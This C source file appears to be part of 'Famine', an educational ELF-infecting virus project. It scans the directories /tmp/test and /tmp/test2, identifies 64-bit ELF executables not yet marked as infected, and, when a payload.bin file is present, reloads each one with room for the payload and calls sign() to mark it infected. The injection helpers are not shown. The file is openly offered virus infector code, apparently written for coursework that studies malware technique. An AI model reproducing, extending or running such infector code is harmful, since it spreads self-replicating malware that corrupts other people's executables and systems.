#include "famine.h"
#include <dirent.h>
#include <elf.h>
#include <stdio.h>
#include <sys/stat.h>

#ifndef PATH_MAX
# define PATH_MAX 4096
#endif

static int  is_dot_entry(const char *name)
{
    if (name[0] != '.')
        return 0;
    if (name[1] == '\0')
        return 1;
    if (name[1] == '.' && name[2] == '\0')
        return 1;
    return 0;
}

static int  is_elf64(t_file file)
{
    Elf64_Ehdr  *ehdr;

    if (file.head == MAP_FAILED || file.size < sizeof(Elf64_Ehdr))
        return 0;
    ehdr = (Elf64_Ehdr *)file.head;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
        return 0;
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
        return 0;
    if (ehdr->e_phoff > file.size || ehdr->e_phentsize != sizeof(Elf64_Phdr))
        return 0;
    if (ehdr->e_phnum > (file.size - ehdr->e_phoff) / sizeof(Elf64_Phdr))
        return 0;
    if (last_phdr(file.head) == NULL)
        return 0;
    return 1;
}

static int  payload_available(void)
{
    struct stat st;

    if (lstat("payload.bin", &st) < 0)
        return 0;
    if (!S_ISREG(st.st_mode) || st.st_size != PAYLOAD_BIN_SIZE)
        return 0;
    return 1;
}

static void infect_file(const char *path)
{
    struct stat st;
    t_file      target;

    if (lstat(path, &st) < 0)
        return;
    if (!S_ISREG(st.st_mode) || st.st_size < (off_t)sizeof(Elf64_Ehdr))
        return;
    target = file_load(path, 0);
    if (!is_elf64(target) || is_signed(target))
    {
        file_unload(target);
        return;
    }
    file_unload(target);
    if (!payload_available())
        return;
    target = file_load(path, PAYLOAD_BIN_SIZE);
    if (is_elf64(target))
        sign(target);
    else
        file_unload(target);
}

static void scan_directory(const char *dirname)
{
    DIR             *dir;
    struct dirent   *entry;
    char            path[PATH_MAX];
    int             written;

    dir = opendir(dirname);
    if (dir == NULL)
        return;
    entry = readdir(dir);
    while (entry != NULL)
    {
        written = snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        if (!is_dot_entry(entry->d_name)
            && written >= 0 && written < (int)sizeof(path))
            infect_file(path);
        entry = readdir(dir);
    }
    closedir(dir);
}

void    scan_targets(void)
{
    scan_directory("/tmp/test");
    scan_directory("/tmp/test2");
}
